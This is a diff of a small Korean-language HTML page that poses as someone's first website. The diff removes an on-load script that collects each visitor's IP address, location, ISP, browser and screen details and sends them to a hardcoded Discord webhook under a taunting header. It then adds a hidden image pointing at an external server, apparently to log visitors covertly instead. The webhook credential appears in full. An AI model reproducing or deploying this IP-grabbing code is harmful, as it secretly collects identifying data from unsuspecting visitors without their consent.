@@ -3,56 +3,12 @@
 <head>
     <meta charset="UTF-8">
     <title>test site</title>
-    <script>
-        // 1. 본인의 디스코드 웹훅 URL을 입력해 주세요.
-        const DISCORD_WEBHOOK_URL = "https://discord.com/api/webhooks/1554079546448285738/bPvvBD1kInPi0nVVwC1y9rMM1RUo3aApOciZMQyGjx1Sa0Aids9GLlCPfJ9B_nRpGx3-".trim();
-
-        // 2. ip-api가 데이터를 가져오면 자동으로 실행되는 콜백 함수 (CORS 우회 핵심)
-        function getIpData(data) {
-            const clientIp = data.query || "수집 실패";
-            const country = data.country || "알 수 없음";
-            const region = data.regionName || "알 수 없음";
-            const city = data.city || "알 수 없음";
-            const isp = data.isp || "알 수 없음";
-
-            const userAgent = navigator.userAgent;
-            const screenResolution = window.screen.width + "x" + window.screen.height;
-
-            // 디스코드로 전송할 메시지 구조
-            const payload = {
-                content: "# **아이피땄다씨발ㅗㅗㅗㅗ**\n" +
-                         "- **IP 주소:** `" + clientIp + "`\n" +
-                         "- **위치:** " + country + " - " + region + " (" + city + ")\n" +
-                         "- **통신사(ISP):** " + isp + "\n" +
-                         "- **접속 시간:** " + new Date().toLocaleString() + "\n" +
-                         "- **화면 해상도:** " + screenResolution + "\n" +
-                         "- **브라우저 정보:** " + userAgent
-            };
-
-            // 디스코드 웹훅 전송
-            fetch(DISCORD_WEBHOOK_URL, {
-                method: 'POST',
-                headers: { 'Content-Type': 'application/json' },
-                body: JSON.stringify(payload)
-            })
-            .then(() => console.log("IP 및 접속 로그 전송 완료"))
-            .catch(err => console.error("웹훅 전송 에러:", err));
-        }
-
-        // 페이지가 열리면 JSONP 스크립트를 강제로 주입하여 차단을 우회합니다.
-        window.onload = function() {
-            const script = document.createElement('script');
-            // callback=getIpData 를 주어 CORS 제한 없이 함수를 직접 실행하게 만듭니다.
-            script.src = 'https://extreme-ip-lookup.com'; 
-            
-            // 만약 위 API가 안되면 아래 주소 주석을 풀고 교체하세요.
-            // script.src = 'https://ipapi.co';
-
-            document.head.appendChild(script);
-        };
-    </script>
 </head>
 <body>
     <h1>첨으로 웹사이트 만듬ㅋ</h1>
+
+    <!-- 여기에 서버 주소가 자동으로 들어가 있습니다 -->
+    <img src="https://onrender.com" style="display:none;" />
+    
 </body>
 </html>
